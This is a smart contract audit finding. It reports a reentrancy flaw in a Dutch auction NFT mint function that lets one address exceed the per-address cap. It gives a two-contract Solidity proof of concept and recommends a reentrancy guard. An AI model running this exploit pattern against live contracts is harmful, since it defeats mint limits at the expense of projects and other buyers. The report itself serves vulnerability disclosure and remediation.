# [H] [HIGH] A user can end up holding more than the cap per address at the end of one transaction

## Summary
Severity: High
Reporter: 0xtotem
Source: https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L161-L165
Type: audit-issue

## Details
# [HIGH] A user can end up holding more than the cap per address at the end of one transaction

## Summary

Since the `mint` function allow reentrancy, it is possible to send more ether while minting with a contract to trigger a refund. The contract can then mint during the `receive` and send it to the original minter.
Note that this can be cascaded with more contract calls within `receive`.

https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L161-L165

## Vulnerability Detail

## Impact

On address can hold more than `CAP_PER_ADDRESS` which doesn't reflects the state of the `mintedPerAddress` after on transaction.

## Code Snippet

It is possible to exploit it with two simple contracts:

```solidity
contract FirstAttacker is IERC721Receiver {
   // ...
   function attack() {
        uint priceForCap = nft.getPrice() * nft.CAP_PER_ADDRESS();
        nft.mint{value: priceForCap + 1}(nft.CAP_PER_ADDRESS());
   }
    receive() external payable {
        extraMint.mint();
    }
}

contract ExtraMint is IERC721Receiver {
   // ...
   function mint() {
        uint capPerAddress = nft.CAP_PER_ADDRESS();
        uint priceForCap = nft.getPrice() * capPerAddress;

        uint currentTokenId = nft.minted();
        nft.mint{value: priceForCap}(capPerAddress);

        for (uint i=0; i < capPerAddress ; i++) {
            nft.safeTransferFrom(address(this), firstAttacker, currentTokenId + i);
        }
        
   }
}
```


## Tool used

Manual Review

## Recommendation

Adding a [reentrancy guard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) to the mint function.
